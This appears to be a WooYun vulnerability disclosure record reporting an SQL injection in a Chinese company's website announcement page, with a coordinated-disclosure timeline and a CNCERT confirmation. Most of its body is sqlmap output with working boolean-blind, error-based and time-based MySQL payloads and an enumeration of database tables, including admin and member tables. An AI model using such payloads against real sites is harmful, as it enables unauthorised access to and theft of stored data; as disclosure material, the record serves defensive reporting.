wybug_title: 浙江新和成股份有限公司sql注入
wybug_corp: 浙江新和成股份有限公司
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-21：	细节已通知厂商并且等待厂商处理中									2015-12-25：	厂商已经确认，细节仅向厂商公开									2016-01-04：	细节向核心白帽子及相关领域专家公开									2016-01-14：	细节向普通白帽子公开									2016-01-24：	细节向实习白帽子公开									2016-02-06：	细节向公众公开  简要描述： 浙江新和成股份有限公司成立于1999年，2004年在深圳中小企业板上市，股票代码002001。 详细说明：  
http://**.**.**.**/gonggao.php?tid=181

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=181 AND 7836=7836    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: tid=181 AND (SELECT 8084 FROM(SELECT COUNT(*),CONCAT(0x7162767071,(SELECT (ELT(8084=8084,1))),0x716b717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: tid=181 AND (SELECT * FROM (SELECT(SLEEP(10)))ocgG)---web application technology: Apache, PHP 5.2.17back-end DBMS: MySQL 5.0available databases [2]:[*] information_schema[*] newhcDatabase: newhc+--------------------+---------+| Table              | Entries |+--------------------+---------+| hxcms_news         | 851     || hxcms_contact      | 819     || hxcms_class        | 467     || hxcms_field        | 334     || hxcms_bodys        | 157     || hxcms_announce     | 83      || hxcms_comments     | 40      || hxcms_honors       | 37      || hxcms_channel      | 21      || hxcms_classfiy     | 11      || hxcms_food         | 10      || hxcms_orderlist    | 9       || hxcms_address      | 8       || hxcms_about        | 7       || hxcms_adv          | 7       || hxcms_batch        | 6       || hxcms_buycar_model | 6       || hxcms_product      | 5       || hxcms_travel       | 5       || hxcms_coll         | 4       || hxcms_memup        | 4       || hxcms_bodytest     | 3       || hxcms_dkbuy        | 3       || hxcms_member       | 3       || hxcms_network      | 3       || hxcms_orders       | 3       || hxcms_weblink      | 3       || hxcms_job          | 2       || hxcms_questions    | 2       || hxcms_select       | 2       || hxcms_addlist      | 1       || hxcms_admin        | 1       || hxcms_allsky       | 1       || hxcms_booking      | 1       || hxcms_buy          | 1       || hxcms_config       | 1       || hxcms_famous       | 1       || hxcms_joinline     | 1       || hxcms_order        | 1       || hxcms_report       | 1       || hxcms_resume       | 1       |+--------------------+---------+

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-25 11:13 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给浙江分中心，由浙江分中心后续协调网站管理单位处置  最新状态： 暂无
